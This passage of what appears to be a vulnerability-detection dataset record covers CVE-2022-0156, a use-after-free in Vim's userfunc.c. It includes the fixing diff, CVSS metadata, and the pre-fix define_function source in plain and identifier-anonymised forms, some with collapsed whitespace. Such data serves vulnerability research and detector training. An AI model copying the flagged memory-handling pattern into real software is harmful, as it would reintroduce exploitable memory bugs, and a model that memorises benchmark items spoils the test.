}",vim/9f1a39a5d1cd7989ada2d1cb32f97d84360e050f/userfunc.c/vul/after/1.json,"--- func_before
+++ func_after
@@ -17,7 +17,6 @@
     garray_T	newlines;
     char_u	*cmdline = NULL;
     int		ret = FAIL;
-    char_u	*line_to_free = NULL;
     partial_T	*pt;
     char_u	*name;
     int		lnum_save = -1;
@@ -43,12 +42,9 @@
     }
 
     ga_init2(&newlines, (int)sizeof(char_u *), 10);
-    if (get_function_body(&eap, &newlines, NULL, &line_to_free) == FAIL)
-    {
-	if (cmdline != line_to_free)
-	    vim_free(cmdline);
+    if (get_function_body(&eap, &newlines, NULL,
+					     &evalarg->eval_tofree_ga) == FAIL)
 	goto erret;
-    }
 
     // When inside a lambda must add the function lines to evalarg.eval_ga.
     evalarg->eval_break_count += newlines.ga_len;
@@ -107,8 +103,6 @@
 	{
 	    ((char_u **)(tfgap->ga_data))[tfgap->ga_len++] = cmdline;
 	    evalarg->eval_using_cmdline = TRUE;
-	    if (cmdline == line_to_free)
-		line_to_free = NULL;
 	}
     }
     else
@@ -177,7 +171,6 @@
 erret:
     if (lnum_save >= 0)
 	SOURCING_LNUM = lnum_save;
-    vim_free(line_to_free);
     ga_clear_strings(&newlines);
     if (newargs != NULL)
 	ga_clear_strings(newargs);","{'deleted_lines': ['    char_u\t*line_to_free = NULL;', '    if (get_function_body(&eap, &newlines, NULL, &line_to_free) == FAIL)', '    {', '\tif (cmdline != line_to_free)', '\t    vim_free(cmdline);', '    }', '\t    if (cmdline == line_to_free)', '\t\tline_to_free = NULL;', '    vim_free(line_to_free);'], 'added_lines': ['    if (get_function_body(&eap, &newlines, NULL,', '\t\t\t\t\t     &evalarg->eval_tofree_ga) == FAIL)']}",True,vim is vulnerable to Use After Free,5.5,MEDIUM,1,valid,2022-01-08T15:39:39Z,4
CVE-2022-0156,['CWE-416'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,vim,"patch 8.2.4040: keeping track of allocated lines is too complicated

Problem:    Keeping track of allocated lines in user functions is too
            complicated.
Solution:   Instead of freeing individual lines keep them all until the end.",9f1a39a5d1cd7989ada2d1cb32f97d84360e050f,https://github.com/vim/vim/commit/9f1a39a5d1cd7989ada2d1cb32f97d84360e050f,src/userfunc.c,define_function,"ufunc_T *
define_function(exarg_T *eap, char_u *name_arg, char_u **line_to_free)
{
intj;
intc;
intsaved_did_emsg;
char_u*name = name_arg;
intis_global = FALSE;
char_u*p;
char_u*arg;
char_u*whitep;
char_u*line_arg = NULL;
garray_Tnewargs;
garray_Targtypes;
garray_Tdefault_args;
garray_Tnewlines;
intvarargs = FALSE;
intflags = 0;
char_u*ret_type = NULL;
ufunc_T*fp = NULL;
intfp_allocated = FALSE;
intfree_fp = FALSE;
intoverwrite = FALSE;
dictitem_T*v;
funcdict_Tfudi;
static intfunc_nr = 0;        intparen;
hashitem_T*hi;
linenr_Tsourcing_lnum_top;
intvim9script = in_vim9script();
imported_T*import = NULL;
if (ends_excmd2(eap->cmd, eap->arg))
{
if (!eap->skip)
list_functions(NULL);
set_nextcmd(eap, eap->arg);
return NULL;
}
if (*eap->arg == '/')
{
p = skip_regexp(eap->arg + 1, '/', TRUE);
if (!eap->skip)
{
regmatch_Tregmatch;
c = *p;
*p = NUL;
regmatch.regprog = vim_regcomp(eap->arg + 1, RE_MAGIC);
*p = c;
if (regmatch.regprog != NULL)
{
regmatch.rm_ic = p_ic;
list_functions(&regmatch);
vim_regfree(regmatch.regprog);
}
}
if (*p == '/')
++p;
set_nextcmd(eap, p);
return NULL;
}
ga_init(&newargs);
ga_init(&argtypes);
ga_init(&default_args);
p = eap->arg;
if (name_arg != NULL)
{
paren = TRUE;
CLEAR_FIELD(fudi);
}
else
{
name = save_function_name(&p, &is_global, eap->skip,
TFN_NO_AUTOLOAD, &fudi);
paren = (vim_strchr(p, '(') != NULL);
if (name == NULL && (fudi.fd_dict == NULL || !paren) && !eap->skip)
{
if (!aborting())
{
if (!eap->skip && fudi.fd_newkey != NULL)
semsg(_(e_key_not_present_in_dictionary), fudi.fd_newkey);
vim_free(fudi.fd_newkey);
return NULL;
}
else
eap->skip = TRUE;
}
}
saved_did_emsg = did_emsg;
did_emsg = FALSE;
if (!paren)
{
if (!ends_excmd(*skipwhite(p)))
{
semsg(_(e_trailing_characters_str), p);
goto ret_free;
}
set_nextcmd(eap, p);
if (eap->nextcmd != NULL)
*p = NUL;
if (!eap->skip && !got_int)
{
fp = find_func(name, is_global, NULL);
if (fp == NULL && ASCII_ISUPPER(*eap->arg))
{
char_u *up = untrans_function_name(name);
if (up != NULL)
fp = find_func(up, FALSE, NULL);
}
if (fp != NULL)
{
list_func_head(fp, TRUE);
for (j = 0; j < fp->uf_lines.ga_len && !got_int; ++j)
{
if (FUNCLINE(fp, j) == NULL)
continue;
msg_putchar('\n');
msg_outnum((long)(j + 1));
if (j < 9)
msg_putchar(' ');
if (j < 99)
msg_putchar(' ');
msg_prt_line(FUNCLINE(fp, j), FALSE);
out_flush();    ui_breakcheck();
}
if (!got_int)
{
msg_putchar('\n');
if (fp->uf_def_status != UF_NOT_COMPILED)
msg_puts(""   enddef"");
else
msg_puts(""   endfunction"");
}
}
else
emsg_funcname(e_undefined_function_str, eap->arg);
}
goto ret_free;
}
p = skipwhite(p);
if (*p != '(')
{
if (!eap->skip)
{
semsg(_(e_missing_paren_str), eap->arg);
goto ret_free;
}
if (vim_strchr(p, '(') != NULL)
p = vim_strchr(p, '(');
}
if ((vim9script || eap->cmdidx == CMD_def) && VIM_ISWHITE(p[-1]))
{
semsg(_(e_no_white_space_allowed_before_str_str), ""("", p - 1);
goto ret_free;
}
if (vim9script && eap->forceit && !is_global)
{
emsg(_(e_no_bang_allowed));
goto ret_free;
}
ga_init2(&newlines, (int)sizeof(char_u *), 10);
if (!eap->skip && name_arg == NULL)
{
if (name != NULL)
arg = name;
else
arg = fudi.fd_newkey;
if (arg != NULL && (fudi.fd_di == NULL
|| (fudi.fd_di->di_tv.v_type != VAR_FUNC
&& fudi.fd_di->di_tv.v_type != VAR_PARTIAL)))
{
char_u  *name_base = arg;
int    i;
if (*arg == K_SPECIAL)
{
name_base = vim_strchr(arg, '_');
if (name_base == NULL)
name_base = arg + 3;
else
++name_base;
}
for (i = 0; name_base[i] != NUL && (i == 0
? eval_isnamec1(name_base[i])
: eval_isnamec(name_base[i])); ++i)
;
if (name_base[i] != NUL)
emsg_funcname(e_invalid_argument_str, arg);
if (vim9script && *arg == K_SPECIAL
&& eval_variable(name_base, (int)STRLEN(name_base), 0, NULL,
NULL, EVAL_VAR_NOAUTOLOAD + EVAL_VAR_IMPORT
+ EVAL_VAR_NO_FUNC) == OK)
{
semsg(_(e_redefining_script_item_str), name_base);
goto ret_free;
}
}
if (fudi.fd_dict != NULL && fudi.fd_dict->dv_scope == VAR_DEF_SCOPE)
{
emsg(_(e_cannot_use_g_here));
goto ret_free;
}
}
++p;
if (get_function_args(&p, ')', &newargs,
eap->cmdidx == CMD_def ? &argtypes : NULL, FALSE,
NULL, &varargs, &default_args, eap->skip,
eap, line_to_free) == FAIL)
goto errret_2;
whitep = p;
if (eap->cmdidx == CMD_def)
{
if (*skipwhite(p) == ':')
{
if (*p != ':')
{
semsg(_(e_no_white_space_allowed_before_colon_str), p);
p = skipwhite(p);
}
else if (!IS_WHITE_OR_NUL(p[1]))
semsg(_(e_white_space_required_after_str_str), "":"", p);
ret_type = skipwhite(p + 1);
p = skip_type(ret_type, FALSE);
if (p > ret_type)
{
ret_type = vim_strnsave(ret_type, p - ret_type);
whitep = p;
p = skipwhite(p);
}
else
{
semsg(_(e_expected_type_str), ret_type);
ret_type = NULL;
}
}
p = skipwhite(p);
}
else
for (;;)
{
whitep = p;
p = skipwhite(p);
if (STRNCMP(p, ""range"", 5) == 0)
{
flags |= FC_RANGE;
p += 5;
}
else if (STRNCMP(p, ""dict"", 4) == 0)
{
flags |= FC_DICT;
p += 4;
}
else if (STRNCMP(p, ""abort"", 5) == 0)
{
flags |= FC_ABORT;
p += 5;
}
else if (STRNCMP(p, ""closure"", 7) == 0)
{
flags |= FC_CLOSURE;
p += 7;
if (current_funccal == NULL)
{
emsg_funcname(e_closure_function_should_not_be_at_top_level,
name == NULL ? (char_u *)"""" : name);
goto erret;
}
}
else
break;
}
if (*p == '\n')
line_arg = p + 1;
else if (*p != NUL
&& !(*p == '""' && (!vim9script || eap->cmdidx == CMD_function)
&& eap->cmdidx != CMD_def)
&& !(VIM_ISWHITE(*whitep) && *p == '#'
&& (vim9script || eap->cmdidx == CMD_def))
&& !eap->skip
&& !did_emsg)
semsg(_(e_trailing_characters_str), p);
if (KeyTyped)
{
if (!eap->skip && !eap->forceit)
{
if (fudi.fd_dict != NULL && fudi.fd_newkey == NULL)
emsg(_(e_dictionary_entry_already_exists));
else if (name != NULL && find_func(name, is_global, NULL) != NULL)
emsg_funcname(e_function_str_already_exists_add_bang_to_replace, name);
}
if (!eap->skip && did_emsg)
goto erret;
msg_putchar('\n');    cmdline_row = msg_row;
}
sourcing_lnum_top = SOURCING_LNUM;
if (get_function_body(eap, &newlines, line_arg, line_to_free) == FAIL
|| eap->skip)
goto erret;
if (fudi.fd_dict == NULL)
{
hashtab_T*ht;
v = find_var(name, &ht, TRUE);
if (v != NULL && v->di_tv.v_type == VAR_FUNC)
{
emsg_funcname(e_function_name_conflicts_with_variable_str, name);
goto erret;
}
fp = find_func_even_dead(name, is_global, NULL);
if (vim9script)
{
char_u *uname = untrans_function_name(name);
import = find_imported(uname == NULL ? name : uname, 0, NULL);
}
if (fp != NULL || import != NULL)
{
int dead = fp != NULL && (fp->uf_flags & FC_DEAD);
if (import != NULL
|| (!dead && !eap->forceit
&& (fp->uf_script_ctx.sc_sid != current_sctx.sc_sid
|| fp->uf_script_ctx.sc_seq == current_sctx.sc_seq)))
{
SOURCING_LNUM = sourcing_lnum_top;
if (vim9script)
emsg_funcname(e_name_already_defined_str, name);
else
emsg_funcname(e_function_str_already_exists_add_bang_to_replace, name);
goto erret;
}
if (fp->uf_calls > 0)
{
emsg_funcname(
e_cannot_redefine_function_str_it_is_in_use, name);
goto erret;
}
if (fp->uf_refcount > 1)
{
--fp->uf_refcount;
fp->uf_flags |= FC_REMOVED;
fp = NULL;
overwrite = TRUE;
}
else
{
char_u *exp_name = fp->uf_name_exp;
VIM_CLEAR(name);
fp->uf_name_exp = NULL;
func_clear_items(fp);
fp->uf_name_exp = exp_name;
fp->uf_flags &= ~FC_DEAD;
#ifdef FEAT_PROFILE
fp->uf_profiling = FALSE;
fp->uf_prof_initialized = FALSE;
#endif
fp->uf_def_status = UF_NOT_COMPILED;
}
}
}
else
{
charnumbuf[20];
fp = NULL;
if (fudi.fd_newkey == NULL && !eap->forceit)
{
emsg(_(e_dictionary_entry_already_exists));
goto erret;
}
if (fudi.fd_di == NULL)
{
if (value_check_lock(fudi.fd_dict->dv_lock, eap->arg, FALSE))
goto erret;
}
else if (value_check_lock(fudi.fd_di->di_tv.v_lock, eap->arg, FALSE))
goto erret;
vim_free(name);
sprintf(numbuf, ""%d"", ++func_nr);
name = vim_strsave((char_u *)numbuf);
if (name == NULL)
goto erret;
}
if (fp == NULL)
{
if (fudi.fd_dict == NULL && vim_strchr(name, AUTOLOAD_CHAR) != NULL)
{
int    slen, plen;
char_u  *scriptname;
j = FAIL;
if (SOURCING_NAME != NULL)
{
scriptname = autoload_name(name);
if (scriptname != NULL)
{
p = vim_strchr(scriptname, '/');
plen = (int)STRLEN(p);
slen = (int)STRLEN(SOURCING_NAME);
if (slen > plen && fnamecmp(p,
SOURCING_NAME + slen - plen) == 0)
j = OK;
vim_free(scriptname);
}
}
if (j == FAIL)
{
linenr_T save_lnum = SOURCING_LNUM;
SOURCING_LNUM = sourcing_lnum_top;
semsg(_(e_function_name_does_not_match_script_file_name_str),
name);
SOURCING_LNUM = save_lnum;
goto erret;
}
}
fp = alloc_clear(offsetof(ufunc_T, uf_name) + STRLEN(name) + 1);
if (fp == NULL)
goto erret;
fp_allocated = TRUE;
if (fudi.fd_dict != NULL)
{
if (fudi.fd_di == NULL)
{
fudi.fd_di = dictitem_alloc(fudi.fd_newkey);
if (fudi.fd_di == NULL)
{
vim_free(fp);
fp = NULL;
goto erret;
}
if (dict_add(fudi.fd_dict, fudi.fd_di) == FAIL)
{
vim_free(fudi.fd_di);
vim_free(fp);
fp = NULL;
goto erret;
}
}
else
clear_tv(&fudi.fd_di->di_tv);
fudi.fd_di->di_tv.v_type = VAR_FUNC;
fudi.fd_di->di_tv.vval.v_string = vim_strsave(name);
flags |= FC_DICT;
}
}
fp->uf_args = newargs;
fp->uf_def_args = default_args;
fp->uf_ret_type = &t_any;
fp->uf_func_type = &t_func_any;
if (eap->cmdidx == CMD_def)
{
int    lnum_save = SOURCING_LNUM;
cstack_T    *cstack = eap->cstack;
fp->uf_def_status = UF_TO_BE_COMPILED;
SOURCING_LNUM = sourcing_lnum_top;
function_using_block_scopes(fp, cstack);
if (parse_argument_types(fp, &argtypes, varargs) == FAIL)
{
SOURCING_LNUM = lnum_save;
free_fp = fp_allocated;
goto erret;
}
varargs = FALSE;
if (parse_return_type(fp, ret_type) == FAIL)
{
SOURCING_LNUM = lnum_save;
free_fp = fp_allocated;
goto erret;
}
SOURCING_LNUM = lnum_save;
}
else
fp->uf_def_status = UF_NOT_COMPILED;
if (fp_allocated)
{
set_ufunc_name(fp, name);
if (overwrite)
{
hi = hash_find(&func_hashtab, name);
hi->hi_key = UF2HIKEY(fp);
}
else if (hash_add(&func_hashtab, UF2HIKEY(fp)) == FAIL)
{
free_fp = TRUE;
goto erret;
}
fp->uf_refcount = 1;
}
fp->uf_lines = newlines;
newlines.ga_data = NULL;
if ((flags & FC_CLOSURE) != 0)
{
if (register_closure(fp) == FAIL)
goto erret;
}
else
fp->uf_scoped = NULL;
#ifdef FEAT_PROFILE
if (prof_def_func())
func_do_profile(fp);
#endif
fp->uf_varargs = varargs;
if (sandbox)
flags |= FC_SANDBOX;
if (vim9script && !ASCII_ISUPPER(*fp->uf_name))
flags |= FC_VIM9;
fp->uf_flags = flags;
fp->uf_calls = 0;
fp->uf_cleared = FALSE;
fp->uf_script_ctx = current_sctx;
fp->uf_script_ctx_version = current_sctx.sc_version;
fp->uf_script_ctx.sc_lnum += sourcing_lnum_top;
if (is_export)
{
fp->uf_flags |= FC_EXPORT;
is_export = FALSE;
}
if (eap->cmdidx == CMD_def)
set_function_type(fp);
else if (fp->uf_script_ctx.sc_version == SCRIPT_VERSION_VIM9)
fp->uf_script_ctx.sc_version = SCRIPT_VERSION_MAX;
goto ret_free;
erret:
ga_clear_strings(&newargs);
ga_clear_strings(&default_args);
if (fp != NULL)
{
ga_init(&fp->uf_args);
ga_init(&fp->uf_def_args);
}
errret_2:
ga_clear_strings(&newlines);
if (fp != NULL)
VIM_CLEAR(fp->uf_arg_types);
if (free_fp)
{
vim_free(fp);
fp = NULL;
}
ret_free:
ga_clear_strings(&argtypes);
vim_free(fudi.fd_newkey);
if (name != name_arg)
vim_free(name);
vim_free(ret_type);
did_emsg |= saved_did_emsg;
return fp;
}","ufunc_T *
define_function(exarg_T *VAR_0, char_u *VAR_1, char_u **VAR_2)
{
intVAR_3;
intVAR_4;
intVAR_5;
char_u*VAR_6 = VAR_1;
intVAR_7 = FALSE;
char_u*VAR_8;
char_u*VAR_9;
char_u*VAR_10;
char_u*VAR_11 = NULL;
garray_TVAR_12;
garray_TVAR_13;
garray_TVAR_14;
garray_TVAR_15;
intVAR_16 = FALSE;
intVAR_17 = 0;
char_u*VAR_18 = NULL;
ufunc_T*VAR_19 = NULL;
intVAR_20 = FALSE;
intVAR_21 = FALSE;
intVAR_22 = FALSE;
dictitem_T*VAR_23;
funcdict_TVAR_24;
static intVAR_25 = 0;    
intVAR_26;
hashitem_T*VAR_27;
linenr_TVAR_28;
intVAR_29 = in_vim9script();
imported_T*VAR_30 = NULL;
if (ends_excmd2(VAR_0->cmd, VAR_0->arg))
{
if (!VAR_0->skip)
list_functions(NULL);
set_nextcmd(VAR_0, VAR_0->arg);
return NULL;
}
if (*VAR_0->arg == '/')
{
VAR_8 = skip_regexp(VAR_0->arg + 1, '/', TRUE);
if (!VAR_0->skip)
{
regmatch_TVAR_31;
VAR_4 = *VAR_8;
*VAR_8 = VAR_32;
VAR_31.regprog = vim_regcomp(VAR_0->arg + 1, VAR_33);
*VAR_8 = VAR_4;
if (VAR_31.regprog != NULL)
{
VAR_31.rm_ic = VAR_34;
list_functions(&VAR_31);
vim_regfree(VAR_31.regprog);
}
}
if (*VAR_8 == '/')
++VAR_8;
set_nextcmd(VAR_0, VAR_8);
return NULL;
}
ga_init(&VAR_12);
ga_init(&VAR_13);
ga_init(&VAR_14);
VAR_8 = VAR_0->arg;
if (VAR_1 != NULL)
{
VAR_26 = TRUE;
CLEAR_FIELD(VAR_24);
}
else
{
VAR_6 = save_function_name(&VAR_8, &VAR_7, VAR_0->skip,
VAR_35, &VAR_24);
VAR_26 = (vim_strchr(VAR_8, '(') != NULL);
if (VAR_6 == NULL && (VAR_24.fd_dict == NULL || !VAR_26) && !VAR_0->skip)
{
if (!aborting())
{
if (!VAR_0->skip && VAR_24.fd_newkey != NULL)
semsg(_(VAR_36), VAR_24.fd_newkey);
vim_free(VAR_24.fd_newkey);
return NULL;
}
else
VAR_0->skip = TRUE;
}
}
VAR_5 = VAR_37;
VAR_37 = FALSE;
if (!VAR_26)
{
if (!ends_excmd(*skipwhite(VAR_8)))
{
semsg(_(VAR_38), VAR_8);
goto ret_free;
}
set_nextcmd(VAR_0, VAR_8);
if (VAR_0->nextcmd != NULL)
*VAR_8 = VAR_32;
if (!VAR_0->skip && !VAR_39)
{
VAR_19 = find_func(VAR_6, VAR_7, NULL);
if (VAR_19 == NULL && ASCII_ISUPPER(*VAR_0->arg))
{
char_u *VAR_40 = untrans_function_name(VAR_6);
if (VAR_40 != NULL)
VAR_19 = find_func(VAR_40, FALSE, NULL);
}
if (VAR_19 != NULL)
{
list_func_head(VAR_19, TRUE);
for (VAR_3 = 0; VAR_3 < VAR_19->uf_lines.ga_len && !VAR_39; ++VAR_3)
{
if (FUNCLINE(VAR_19, VAR_3) == NULL)
continue;
msg_putchar('\n');
msg_outnum((long)(VAR_3 + 1));
if (VAR_3 < 9)
msg_putchar(' ');
if (VAR_3 < 99)
msg_putchar(' ');
msg_prt_line(FUNCLINE(VAR_19, VAR_3), FALSE);
out_flush();
ui_breakcheck();
}
if (!VAR_39)
{
msg_putchar('\n');
if (VAR_19->uf_def_status != VAR_41)
msg_puts(""   enddef"");
else
msg_puts(""   endfunction"");
}
}
else
emsg_funcname(VAR_42, VAR_0->arg);
}
goto ret_free;
}
VAR_8 = skipwhite(VAR_8);
if (*VAR_8 != '(')
{
if (!VAR_0->skip)
{
semsg(_(VAR_43), VAR_0->arg);
goto ret_free;
}
if (vim_strchr(VAR_8, '(') != NULL)
VAR_8 = vim_strchr(VAR_8, '(');
}
if ((VAR_29 || VAR_0->cmdidx == VAR_44) && VIM_ISWHITE(VAR_8[-1]))
{
semsg(_(VAR_45), ""("", VAR_8 - 1);
goto ret_free;
}
if (VAR_29 && VAR_0->forceit && !VAR_7)
{
emsg(_(VAR_46));
goto ret_free;
}
ga_init2(&VAR_15, (int)sizeof(char_u *), 10);
if (!VAR_0->skip && VAR_1 == NULL)
{
if (VAR_6 != NULL)
VAR_9 = VAR_6;
else
VAR_9 = VAR_24.fd_newkey;
if (VAR_9 != NULL && (VAR_24.fd_di == NULL
|| (VAR_24.fd_di->di_tv.v_type != VAR_47
&& VAR_24.fd_di->di_tv.v_type != VAR_48)))
{
char_u  *VAR_49 = VAR_9;
int    VAR_50;
if (*VAR_9 == VAR_51)
{
VAR_49 = vim_strchr(VAR_9, '_');
if (VAR_49 == NULL)
VAR_49 = VAR_9 + 3;
else
++VAR_49;
}
for (VAR_50 = 0; VAR_49[VAR_50] != VAR_32 && (VAR_50 == 0
? eval_isnamec1(VAR_49[VAR_50])
: eval_isnamec(VAR_49[VAR_50])); ++VAR_50)
;
if (VAR_49[VAR_50] != VAR_32)
emsg_funcname(VAR_52, VAR_9);
if (VAR_29 && *VAR_9 == VAR_51
&& eval_variable(VAR_49, (int)STRLEN(VAR_49), 0, NULL,
NULL, VAR_53 + VAR_54
+ VAR_55) == VAR_56)
{
semsg(_(VAR_57), VAR_49);
goto ret_free;
}
}
if (VAR_24.fd_dict != NULL && VAR_24.fd_dict->dv_scope == VAR_58)
{
emsg(_(VAR_59));
goto ret_free;
}
}
++VAR_8;
if (get_function_args(&VAR_8, ')', &VAR_12,
VAR_0->cmdidx == VAR_44 ? &VAR_13 : NULL, FALSE,
NULL, &VAR_16, &VAR_14, VAR_0->skip,
VAR_0, VAR_2) == VAR_60)
goto errret_2;
VAR_10 = VAR_8;
if (VAR_0->cmdidx == VAR_44)
{
if (*skipwhite(VAR_8) == ':')
{
if (*VAR_8 != ':')
{
semsg(_(VAR_61), VAR_8);
VAR_8 = skipwhite(VAR_8);
}
else if (!IS_WHITE_OR_NUL(VAR_8[1]))
semsg(_(VAR_62), "":"", VAR_8);
VAR_18 = skipwhite(VAR_8 + 1);
VAR_8 = skip_type(VAR_18, FALSE);
if (VAR_8 > VAR_18)
{
VAR_18 = vim_strnsave(VAR_18, VAR_8 - VAR_18);
VAR_10 = VAR_8;
VAR_8 = skipwhite(VAR_8);
}
else
{
semsg(_(VAR_63), VAR_18);
VAR_18 = NULL;
}
}
VAR_8 = skipwhite(VAR_8);
}
else
for (;;)
{
VAR_10 = VAR_8;
VAR_8 = skipwhite(VAR_8);
if (STRNCMP(VAR_8, ""range"", 5) == 0)
{
VAR_17 |= VAR_64;
VAR_8 += 5;
}
else if (STRNCMP(VAR_8, ""dict"", 4) == 0)
{
VAR_17 |= VAR_65;
VAR_8 += 4;
}
else if (STRNCMP(VAR_8, ""abort"", 5) == 0)
{
VAR_17 |= VAR_66;
VAR_8 += 5;
}
else if (STRNCMP(VAR_8, ""closure"", 7) == 0)
{
VAR_17 |= VAR_67;
VAR_8 += 7;
if (VAR_68 == NULL)
{
emsg_funcname(VAR_69,
VAR_6 == NULL ? (char_u *)"""" : VAR_6);
goto erret;
}
}
else
break;
}
if (*VAR_8 == '\n')
VAR_11 = VAR_8 + 1;
else if (*VAR_8 != VAR_32
&& !(*VAR_8 == '""' && (!VAR_29 || VAR_0->cmdidx == VAR_70)
&& VAR_0->cmdidx != VAR_44)
&& !(VIM_ISWHITE(*VAR_10) && *VAR_8 == '#'
&& (VAR_29 || VAR_0->cmdidx == VAR_44))
&& !VAR_0->skip
&& !VAR_37)
semsg(_(VAR_38), VAR_8);
if (VAR_71)
{
if (!VAR_0->skip && !VAR_0->forceit)
{
if (VAR_24.fd_dict != NULL && VAR_24.fd_newkey == NULL)
emsg(_(VAR_72));
else if (VAR_6 != NULL && find_func(VAR_6, VAR_7, NULL) != NULL)
emsg_funcname(VAR_73, VAR_6);
}
if (!VAR_0->skip && VAR_37)
goto erret;
msg_putchar('\n');    
VAR_74 = VAR_75;
}
VAR_28 = VAR_76;
if (get_function_body(VAR_0, &VAR_15, VAR_11, VAR_2) == VAR_60
|| VAR_0->skip)
goto erret;
if (VAR_24.fd_dict == NULL)
{
hashtab_T*VAR_77;
VAR_23 = find_var(VAR_6, &VAR_77, TRUE);
if (VAR_23 != NULL && VAR_23->di_tv.v_type == VAR_47)
{
emsg_funcname(VAR_78, VAR_6);
goto erret;
}
VAR_19 = find_func_even_dead(VAR_6, VAR_7, NULL);
if (VAR_29)
{
char_u *VAR_79 = untrans_function_name(VAR_6);
VAR_30 = find_imported(VAR_79 == NULL ? VAR_6 : VAR_79, 0, NULL);
}
if (VAR_19 != NULL || VAR_30 != NULL)
{
int VAR_80 = VAR_19 != NULL && (VAR_19->uf_flags & VAR_81);
if (VAR_30 != NULL
|| (!VAR_80 && !VAR_0->forceit
&& (VAR_19->uf_script_ctx.sc_sid != VAR_82.sc_sid
|| VAR_19->uf_script_ctx.sc_seq == VAR_82.sc_seq)))
{
VAR_76 = VAR_28;
if (VAR_29)
emsg_funcname(VAR_83, VAR_6);
else
emsg_funcname(VAR_73, VAR_6);
goto erret;
}
if (VAR_19->uf_calls > 0)
{
emsg_funcname(
VAR_84, VAR_6);
goto erret;
}
if (VAR_19->uf_refcount > 1)
{
--VAR_19->uf_refcount;
VAR_19->uf_flags |= VAR_85;
VAR_19 = NULL;
VAR_22 = TRUE;
}
else
{
char_u *VAR_86 = VAR_19->uf_name_exp;
VIM_CLEAR(VAR_6);
VAR_19->uf_name_exp = NULL;
func_clear_items(VAR_19);
VAR_19->uf_name_exp = VAR_86;
VAR_19->uf_flags &= ~VAR_81;
#ifdef VAR_87
VAR_19->uf_profiling = FALSE;
VAR_19->uf_prof_initialized = FALSE;
#endif
VAR_19->uf_def_status = VAR_41;
}
}
}
else
{
charVAR_88[20];
VAR_19 = NULL;
if (VAR_24.fd_newkey == NULL && !VAR_0->forceit)
{
emsg(_(VAR_72));
goto erret;
}
if (VAR_24.fd_di == NULL)
{
if (value_check_lock(VAR_24.fd_dict->dv_lock, VAR_0->arg, FALSE))
goto erret;
}
else if (value_check_lock(VAR_24.fd_di->di_tv.v_lock, VAR_0->arg, FALSE))
goto erret;
vim_free(VAR_6);
sprintf(VAR_88, ""%d"", ++VAR_25);
VAR_6 = vim_strsave((char_u *)VAR_88);
if (VAR_6 == NULL)
goto erret;
}
if (VAR_19 == NULL)
{
if (VAR_24.fd_dict == NULL && vim_strchr(VAR_6, VAR_89) != NULL)
{
int    VAR_90, VAR_91;
char_u  *VAR_92;
VAR_3 = VAR_60;
if (VAR_93 != NULL)
{
VAR_92 = autoload_name(VAR_6);
if (VAR_92 != NULL)
{
VAR_8 = vim_strchr(VAR_92, '/');
VAR_91 = (int)STRLEN(VAR_8);
VAR_90 = (int)STRLEN(VAR_93);
if (VAR_90 > VAR_91 && fnamecmp(VAR_8,
VAR_93 + VAR_90 - VAR_91) == 0)
VAR_3 = VAR_56;
vim_free(VAR_92);
}
}
if (VAR_3 == VAR_60)
{
linenr_T VAR_94 = VAR_76;
VAR_76 = VAR_28;
semsg(_(VAR_95),
VAR_6);
VAR_76 = VAR_94;
goto erret;
}
}
VAR_19 = alloc_clear(offsetof(ufunc_T, VAR_96) + STRLEN(VAR_6) + 1);
if (VAR_19 == NULL)
goto erret;
VAR_20 = TRUE;
if (VAR_24.fd_dict != NULL)
{
if (VAR_24.fd_di == NULL)
{
VAR_24.fd_di = dictitem_alloc(VAR_24.fd_newkey);
if (VAR_24.fd_di == NULL)
{
vim_free(VAR_19);
VAR_19 = NULL;
goto erret;
}
if (dict_add(VAR_24.fd_dict, VAR_24.fd_di) == VAR_60)
{
vim_free(VAR_24.fd_di);
vim_free(VAR_19);
VAR_19 = NULL;
goto erret;
}
}
else
clear_tv(&VAR_24.fd_di->di_tv);
VAR_24.fd_di->di_tv.v_type = VAR_47;
VAR_24.fd_di->di_tv.vval.v_string = vim_strsave(VAR_6);
VAR_17 |= VAR_65;
}
}
VAR_19->uf_args = VAR_12;
VAR_19->uf_def_args = VAR_14;
VAR_19->uf_ret_type = &VAR_97;
VAR_19->uf_func_type = &VAR_98;
if (VAR_0->cmdidx == VAR_44)
{
int    VAR_99 = VAR_76;
cstack_T    *VAR_100 = VAR_0->cstack;
VAR_19->uf_def_status = VAR_101;
VAR_76 = VAR_28;
function_using_block_scopes(VAR_19, VAR_100);
if (parse_argument_types(VAR_19, &VAR_13, VAR_16) == VAR_60)
{
VAR_76 = VAR_99;
VAR_21 = VAR_20;
goto erret;
}
VAR_16 = FALSE;
if (parse_return_type(VAR_19, VAR_18) == VAR_60)
{
VAR_76 = VAR_99;
VAR_21 = VAR_20;
goto erret;
}
VAR_76 = VAR_99;
}
else
VAR_19->uf_def_status = VAR_41;
if (VAR_20)
{
set_ufunc_name(VAR_19, VAR_6);
if (VAR_22)
{
VAR_27 = hash_find(&VAR_102, VAR_6);
VAR_27->hi_key = UF2HIKEY(VAR_19);
}
else if (hash_add(&VAR_102, UF2HIKEY(VAR_19)) == VAR_60)
{
VAR_21 = TRUE;
goto erret;
}
VAR_19->uf_refcount = 1;
}
VAR_19->uf_lines = VAR_15;
VAR_15.ga_data = NULL;
if ((VAR_17 & VAR_67) != 0)
{
if (register_closure(VAR_19) == VAR_60)
goto erret;
}
else
VAR_19->uf_scoped = NULL;
#ifdef VAR_87
if (prof_def_func())
func_do_profile(VAR_19);
#endif
VAR_19->uf_varargs = VAR_16;
if (VAR_103)
VAR_17 |= VAR_104;
if (VAR_29 && !ASCII_ISUPPER(*VAR_19->uf_name))
VAR_17 |= VAR_105;
VAR_19->uf_flags = VAR_17;
VAR_19->uf_calls = 0;
VAR_19->uf_cleared = FALSE;
VAR_19->uf_script_ctx = VAR_82;
VAR_19->uf_script_ctx_version = VAR_82.sc_version;
VAR_19->uf_script_ctx.sc_lnum += VAR_28;
if (VAR_106)
{
VAR_19->uf_flags |= VAR_107;
VAR_106 = FALSE;
}
if (VAR_0->cmdidx == VAR_44)
set_function_type(VAR_19);
else if (VAR_19->uf_script_ctx.sc_version == VAR_108)
VAR_19->uf_script_ctx.sc_version = VAR_109;
goto ret_free;
erret:
ga_clear_strings(&VAR_12);
ga_clear_strings(&VAR_14);
if (VAR_19 != NULL)
{
ga_init(&VAR_19->uf_args);
ga_init(&VAR_19->uf_def_args);
}
errret_2:
ga_clear_strings(&VAR_15);
if (VAR_19 != NULL)
VIM_CLEAR(VAR_19->uf_arg_types);
if (VAR_21)
{
vim_free(VAR_19);
VAR_19 = NULL;
}
ret_free:
ga_clear_strings(&VAR_13);
vim_free(VAR_24.fd_newkey);
if (VAR_6 != VAR_1)
vim_free(VAR_6);
